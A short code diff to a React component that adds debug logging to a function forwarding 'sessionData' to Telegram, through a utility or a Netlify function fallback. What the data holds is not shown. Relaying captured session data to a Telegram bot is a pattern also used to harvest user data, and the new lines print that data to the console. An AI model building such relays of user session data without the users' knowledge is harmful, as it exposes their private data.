@@ -31,9 +31,12 @@ function App() {
   // This preserves your desired primary path (sendToTelegram) while ensuring we don't silently lose data
   // if that util is not available or throws (useful for debugging and resilience).
   const safeSendToTelegram = async (sessionData: any) => {
+    console.log('🚀 Starting safeSendToTelegram with data:', sessionData);
+    
     // Primary: use the project's sendToTelegram utility if available
     if (typeof sendToTelegram === 'function') {
       try {
+        console.log('📡 Attempting primary sendToTelegram util...');
         const result = await sendToTelegram(sessionData);
         console.log('✅ sendToTelegram(util) result:', result);
         return result;
@@ -47,14 +50,18 @@ function App() {
 
     // Fallback: call the Netlify function endpoint directly
     try {
+      console.log('📡 Attempting fetch fallback to /.netlify/functions/sendTelegram...');
       const res = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(sessionData)
       });
 
+      console.log('📡 Fetch response status:', res.status, res.statusText);
+
       if (!res.ok) {
         const bodyText = await res.text().catch(() => '');
+        console.error('❌ Fetch response not ok:', bodyText);
         throw new Error(`HTTP ${res.status} ${res.statusText} ${bodyText ? '- ' + bodyText : ''}`);
       }
 
